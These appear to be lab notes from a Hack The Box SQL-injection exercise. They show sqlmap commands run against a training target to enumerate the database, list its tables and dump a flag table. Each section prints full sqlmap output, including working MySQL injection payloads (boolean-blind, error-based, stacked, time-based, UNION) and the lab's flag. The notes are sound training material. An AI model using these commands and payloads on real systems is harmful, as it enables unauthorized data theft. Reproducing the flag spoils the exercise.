# Database Enumeration

## Basic Data

```sh
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case1.php?id=1' --banner --current-user --current-db --is-dba
```

```output title="Output" hl_lines="42 44 46 51"
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:09:08 /2025-04-25/

[19:09:08] [INFO] resuming back-end DBMS 'mysql'
[19:09:08] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 5516=5516

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 6882 FROM(SELECT COUNT(*),CONCAT(0x7176766271,(SELECT (ELT(6882=6882,1))),0x7171787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 7162 FROM (SELECT(SLEEP(5)))quFk)

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176766271,0x6f65734a487951475078486c564b6148434f5570444b4d5758556b5975754a77676d677453435169,0x7171787171),NULL,NULL-- -
---
[19:09:08] [INFO] the back-end DBMS is MySQL
[19:09:08] [INFO] fetching banner
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
banner: '10.3.23-MariaDB-0+deb10u1'
[19:09:08] [INFO] fetching current user
current user: 'user1@localhost'
[19:09:08] [INFO] fetching current database
current database: 'testdb'
[19:09:08] [INFO] testing if current user is DBA
[19:09:08] [INFO] fetching current user
[19:09:09] [WARNING] potential permission problems detected ('command denied')
[19:09:09] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
current user is DBA: False
[19:09:09] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/94.237.57.108'

[*] ending @ 19:09:09 /2025-04-25/
```

## Tables

```sh
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case1.php?id=1' -D testdb --tables
```

```output title="Output" hl_lines="45-48"
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:17:47 /2025-04-25/

[19:17:47] [INFO] resuming back-end DBMS 'mysql'
[19:17:47] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 5516=5516

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 6882 FROM(SELECT COUNT(*),CONCAT(0x7176766271,(SELECT (ELT(6882=6882,1))),0x7171787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 7162 FROM (SELECT(SLEEP(5)))quFk)

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176766271,0x6f65734a487951475078486c564b6148434f5570444b4d5758556b5975754a77676d677453435169,0x7171787171),NULL,NULL-- -
---
[19:17:48] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[19:17:48] [INFO] fetching tables for database: 'testdb'
[19:17:48] [WARNING] potential permission problems detected ('command denied')
Database: testdb
[2 tables]
+-------+
| flag1 |
| users |
+-------+

[19:17:48] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/94.237.57.108'

[*] ending @ 19:17:48 /2025-04-25/
```

## Table Entries

```sh
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case1.php?id=1' -D testdb -T flag1 --dump
```

```output title="Output" hl_lines="47-51"
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:27:25 /2025-04-25/

[19:27:25] [INFO] resuming back-end DBMS 'mysql'
[19:27:25] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 5516=5516

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 6882 FROM(SELECT COUNT(*),CONCAT(0x7176766271,(SELECT (ELT(6882=6882,1))),0x7171787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 7162 FROM (SELECT(SLEEP(5)))quFk)

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176766271,0x6f65734a487951475078486c564b6148434f5570444b4d5758556b5975754a77676d677453435169,0x7171787171),NULL,NULL-- -
---
[19:27:25] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[19:27:25] [INFO] fetching columns for table 'flag1' in database 'testdb'
[19:27:25] [WARNING] potential permission problems detected ('command denied')
[19:27:25] [INFO] fetching entries for table 'flag1' in database 'testdb'
Database: testdb
Table: flag1
[1 entry]
+----+-----------------------------------------------------+
| id | content                                             |
+----+-----------------------------------------------------+
| 1  | HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n} |
+----+-----------------------------------------------------+

[19:27:26] [INFO] table 'testdb.flag1' dumped to CSV file '/root/.local/share/sqlmap/output/94.237.57.108/dump/testdb/flag1.csv'
[19:27:26] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/94.237.57.108'

[*] ending @ 19:27:26 /2025-04-25/
```

## Columns

```sh
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case1.php?id=1' -D testdb -T flag1 -C content --dump
```

```output title="Output" hl_lines="46-50"
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.4#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:34:24 /2025-04-25/

[19:34:24] [INFO] resuming back-end DBMS 'mysql'
[19:34:24] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 5516=5516

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 6882 FROM(SELECT COUNT(*),CONCAT(0x7176766271,(SELECT (ELT(6882=6882,1))),0x7171787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 7162 FROM (SELECT(SLEEP(5)))quFk)

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176766271,0x6f65734a487951475078486c564b6148434f5570444b4d5758556b5975754a77676d677453435169,0x7171787171),NULL,NULL-- -
---
[19:34:25] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[19:34:25] [INFO] fetching entries of column(s) 'content' for table 'flag1' in database 'testdb'
[19:34:25] [WARNING] potential permission problems detected ('command denied')
Database: testdb
Table: flag1
[1 entry]
+-----------------------------------------------------+
| content                                             |
+-----------------------------------------------------+
| HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n} |
+-----------------------------------------------------+

[19:34:25] [INFO] table 'testdb.flag1' dumped to CSV file '/root/.local/share/sqlmap/output/94.237.57.108/dump/testdb/flag1.csv'
[19:34:25] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/94.237.57.108'

[*] ending @ 19:34:25 /2025-04-25/
```

## WHERE Clause

```sh
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case1.php?id=1' -D testdb -T flag1 --dump --where 'content LIKE "HTB{%"'
```

```output title="Output" hl_lines="47-51"
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:44:37 /2025-04-25/

[19:44:37] [INFO] resuming back-end DBMS 'mysql'
[19:44:37] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 5516=5516

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 6882 FROM(SELECT COUNT(*),CONCAT(0x7176766271,(SELECT (ELT(6882=6882,1))),0x7171787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 7162 FROM (SELECT(SLEEP(5)))quFk)

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176766271,0x6f65734a487951475078486c564b6148434f5570444b4d5758556b5975754a77676d677453435169,0x7171787171),NULL,NULL-- -
---
[19:44:37] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[19:44:38] [INFO] fetching columns for table 'flag1' in database 'testdb'
[19:44:38] [WARNING] potential permission problems detected ('command denied')
[19:44:38] [INFO] fetching entries for table 'flag1' in database 'testdb'
Database: testdb
Table: flag1
[1 entry]
+----+-----------------------------------------------------+
| id | content                                             |
+----+-----------------------------------------------------+
| 1  | HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n} |
+----+-----------------------------------------------------+

[19:44:38] [INFO] table 'testdb.flag1' dumped to CSV file '/root/.local/share/sqlmap/output/94.237.57.108/dump/testdb/flag1.csv'
[19:44:38] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/94.237.57.108'

[*] ending @ 19:44:38 /2025-04-25/
```
